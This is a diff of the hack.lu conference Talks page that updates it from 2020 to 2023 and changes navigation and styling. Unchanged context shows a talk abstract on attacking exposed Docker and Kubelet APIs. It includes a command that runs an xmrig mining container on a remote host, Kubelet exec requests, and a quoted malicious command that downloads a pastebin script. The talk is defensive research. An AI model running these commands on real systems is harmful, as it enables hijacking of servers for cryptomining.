@@ -9,14 +9,14 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>Talks - hack.lu 2020</title>
+<!-- begin _includes/seo.html --><title>Talks - hack.lu 2023</title>
 <meta name="description" content="Talks - Hack.lu 2019">
 
 
 
 <meta property="og:type" content="website">
 <meta property="og:locale" content="en_US">
-<meta property="og:site_name" content="hack.lu 2020">
+<meta property="og:site_name" content="hack.lu 2023">
 <meta property="og:title" content="Talks">
 <meta property="og:url" content="/talks/">
 
@@ -77,12 +77,14 @@
 <!-- end _includes/seo.html -->
 
 
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hack.lu 2020 Feed">
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hack.lu 2023 Feed">
 
 <!-- http://t.co/dKP3o1e -->
 <meta name="HandheldFriendly" content="True">
 <meta name="MobileOptimized" content="320">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<a rel="me" href="https://infosec.exchange/@hack_lu">Mastodon</a>
 
 <script>
   document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
@@ -107,6 +109,7 @@
 <![endif]-->
 
 
+
     <!-- start custom head snippets -->
 
 <!-- insert favicons. use https://realfavicongenerator.net/ -->
@@ -127,27 +130,32 @@
   <div class="masthead__inner-wrap">
     <div class="masthead__menu">
       <nav id="site-nav" class="greedy-nav">
-        <a class="site-title" href="/">hack.lu 2020</a>
+        <a class="site-title" href="/">hack.lu 2023</a>
         <ul class="visible-links">
           
             
             <li class="masthead__menu-item">
-              <a href="https://cfp.hack.lu/" >Call-for-Papers</a>
+              <a href="https://pretalx.com/hack-lu-2023/" >Call-for-Papers</a>
             </li>
           
             
             <li class="masthead__menu-item">
-              <a href="/ctf/" >CTF</a>
+              <a href="/sponsoring/" >Sponsoring</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="/agenda/" >Agenda</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="/info/" >Info & Registration</a>
             </li>
           
             
             <li class="masthead__menu-item">
               <a href="/CoD/" >Code of conduct</a>
-            </li>
-          
-            
-            <li class="masthead__menu-item">
-              <a href="https://2019.hack.lu/" >hack.lu 2019</a>
             </li>
           
         </ul>
@@ -818,31 +826,31 @@ KVM today.</p>
 
 <p>We can use a crafted HTTP request or just the docker client as shown bellow:</p>
 
-<p><code class="highlighter-rouge">docker -H target:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig -o POOOOL  -u WALLET -p X -k</code></p>
+<p><code class="language-plaintext highlighter-rouge">docker -H target:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig -o POOOOL  -u WALLET -p X -k</code></p>
 
 <ul>
-  <li>Kubernetes: Unauthenticated endpoint on Kubelet (port 10250) to perform <code class="highlighter-rouge">exec</code> command</li>
+  <li>Kubernetes: Unauthenticated endpoint on Kubelet (port 10250) to perform <code class="language-plaintext highlighter-rouge">exec</code> command</li>
 </ul>
 
 <p>The exploitation take 2 steps, first a POST request to the exec endpoint:</p>
 
-<p><code class="highlighter-rouge">POST "https://target:10250/exec/&lt;namespace&gt;/&lt;podname&gt;/&lt;container-name&gt;?command=whoami&amp;input=1&amp;output=1&amp;tty=1"</code></p>
+<p><code class="language-plaintext highlighter-rouge">POST "https://target:10250/exec/&lt;namespace&gt;/&lt;podname&gt;/&lt;container-name&gt;?command=whoami&amp;input=1&amp;output=1&amp;tty=1"</code></p>
 
 <p>Then a GET request (SPDY capable client) using location header from the response of the previous request</p>
 
-<p><code class="highlighter-rouge">wscat -c "https://target:10250/cri/exec/XxXxXxXx" --no-check</code></p>
+<p><code class="language-plaintext highlighter-rouge">wscat -c "https://target:10250/cri/exec/XxXxXxXx" --no-check</code></p>
 
 <p>A single GET request is used to list the available containers on the target:</p>
 
-<p><code class="highlighter-rouge">GET "https://target:10250/pods"</code></p>
+<p><code class="language-plaintext highlighter-rouge">GET "https://target:10250/pods"</code></p>
 
 <p>Those two examples can be reproduced against most orchestration tools of the API endpoints are not properly secured.</p>
 
 <h3 id="compromising-containers-repositories">compromising containers repositories</h3>
 
-<p>Supply-chain attacks can happen on container image repositories. An attacker could successfully push an update to a well-known container image and just wait for victims to deply/update. Or even creating an account on the repository (let say <code class="highlighter-rouge">Docker Hub</code> for example) and convincing people to use their images.</p>
+<p>Supply-chain attacks can happen on container image repositories. An attacker could successfully push an update to a well-known container image and just wait for victims to deply/update. Or even creating an account on the repository (let say <code class="language-plaintext highlighter-rouge">Docker Hub</code> for example) and convincing people to use their images.</p>
 
-<p>That is exacly what happen recently with Zuulu2 botnet (see https://github.com/docker/hub-feedback/issues/1809). Somebody pushed a <code class="highlighter-rouge">cryptomining</code> image on Docher Hub and exploit weak configuration to download and run the container image. The image is also used to discover new potential targets.</p>
+<p>That is exacly what happen recently with Zuulu2 botnet (see https://github.com/docker/hub-feedback/issues/1809). Somebody pushed a <code class="language-plaintext highlighter-rouge">cryptomining</code> image on Docher Hub and exploit weak configuration to download and run the container image. The image is also used to discover new potential targets.</p>
 
 <h2 id="is-it-legit-">Is it legit ?</h2>
 
@@ -850,7 +858,7 @@ KVM today.</p>
 
 <p>To do that, we developped some script to extract information on available containers online via their exposed API endpoints and parse the extracted data to highlight potentially “unwanted” containers. Identifying online API is done by leveraging internet scanning services (Shodan, Onyphe and Censys).</p>
 
-<p>Another technique consist of downloading unverifed images (to limit the scope of the investigation, we look for modified <code class="highlighter-rouge">alpine</code> images) from container images repositories and analysing startup scripts of those images. A good tool to perform this task for Docker images is Dive (https://github.com/wagoodman/dive).</p>
+<p>Another technique consist of downloading unverifed images (to limit the scope of the investigation, we look for modified <code class="language-plaintext highlighter-rouge">alpine</code> images) from container images repositories and analysing startup scripts of those images. A good tool to perform this task for Docker images is Dive (https://github.com/wagoodman/dive).</p>
 
 <p>In this part, we will present some interesting containers we found running online and drill-down to the TTPs used by the TA behind the supposed infection. Here is some examples (all Docker):</p>
 
@@ -864,9 +872,9 @@ KVM today.</p>
 
 <p>Suspicious level: high</p>
 
-<p>Ok this time we are sure it is malicious : <code class="highlighter-rouge">chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;rm hrfbyyu.sh;wget https://pastebin.com/raw/h7HiT3uR ...</code></p>
+<p>Ok this time we are sure it is malicious : <code class="language-plaintext highlighter-rouge">chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;rm hrfbyyu.sh;wget https://pastebin.com/raw/h7HiT3uR ...</code></p>
 
-<p>So when the image it started, it will install wget via <code class="highlighter-rouge">yum</code> OR <code class="highlighter-rouge">apt-get</code>, then download and execute a script from <code class="highlighter-rouge">pastebin</code> … does not really look legit …</p>
+<p>So when the image it started, it will install wget via <code class="language-plaintext highlighter-rouge">yum</code> OR <code class="language-plaintext highlighter-rouge">apt-get</code>, then download and execute a script from <code class="language-plaintext highlighter-rouge">pastebin</code> … does not really look legit …</p>
 
 <p>The script itself is base64 encoded and contains update and persistence mechanisms for Linux and cryptomining activities.</p>
 
@@ -874,16 +882,16 @@ KVM today.</p>
 
 <p>Suspicious level: high</p>
 
-<p>Some month ago, a user named <code class="highlighter-rouge">zuulu2</code> on Docker Hub uploaded malicious images perfoming scanning of other potential victims and cryptomining activities. It spread exploiting open Docker API. Malicious images were removed from Docker Hub.</p>
+<p>Some month ago, a user named <code class="language-plaintext highlighter-rouge">zuulu2</code> on Docker Hub uploaded malicious images perfoming scanning of other potential victims and cryptomining activities. It spread exploiting open Docker API. Malicious images were removed from Docker Hub.</p>
 
 <p>By getting the list of running or available containers, we can see that the zuulu2 images are still running on several servers.</p>
 
 <h3 id="dockerfile-cmd-runsh">Dockerfile: CMD [“/run.sh”]</h3>
 
-<p>We identified this image posted on Docker Hub 6 month ago. User only uploaded one image and the description was just <code class="highlighter-rouge">CMD ["/run.sh"]</code>. By using Dive, we identified modifications from the base image (alpine):</p>
+<p>We identified this image posted on Docker Hub 6 month ago. User only uploaded one image and the description was just <code class="language-plaintext highlighter-rouge">CMD ["/run.sh"]</code>. By using Dive, we identified modifications from the base image (alpine):</p>
 
 <ul>
-  <li>adding a user named <code class="highlighter-rouge">miner</code></li>
+  <li>adding a user named <code class="language-plaintext highlighter-rouge">miner</code></li>
   <li>downloading and compiling xmrig</li>
   <li>starting the mining process (XMR)</li>
 </ul>
@@ -1540,11 +1548,12 @@ Daniil is also a member of GIAC Advisory Board and creator of Atomic Threat Cove
     
     
     
+    <li><a href="https://infosec.exchange/@hack_lu"><i class="fab fa-fw fa-mastodon"></i> Mastodon</a></li>
     <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2020 hack.lu. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2023 hack.lu. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
